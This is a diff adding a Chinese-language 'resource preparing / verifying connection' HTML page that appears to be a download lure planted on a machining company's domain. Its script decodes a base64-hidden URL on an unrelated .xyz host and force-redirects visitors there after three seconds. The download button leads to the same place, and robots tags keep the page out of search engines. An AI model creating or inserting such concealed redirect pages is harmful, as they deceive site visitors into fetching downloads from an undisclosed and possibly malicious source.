@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <link rel="canonical" href="https://yhmachining.cn/">
+  <title>资源准备中</title>
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="kexue-page">
+  <main class="kexue-card">
+    <p class="eyebrow">资源准备中</p>
+    <h1>正在校验连接环境</h1>
+    <p>即将进入下载页面</p>
+    <p>请勿关闭当前页面</p>
+    <div class="progress" aria-hidden="true"><span></span></div>
+    <a id="manualDownload" class="glow-btn download-btn-yhmachining-govcn" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
+  </main>
+  <script>
+    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9haHpxLjMxMzQ4Ni54eXo6MzU4ODgv");
+    const manualDownload = document.getElementById("manualDownload");
+
+    window.setTimeout(function () {
+      window.location.replace(REAL_DOWNLOAD_URL);
+    }, 3000);
+
+    manualDownload.addEventListener("click", function(e){
+      e.preventDefault();
+      window.location.replace(REAL_DOWNLOAD_URL);
+    });
+  </script>
+</body>
+</html>
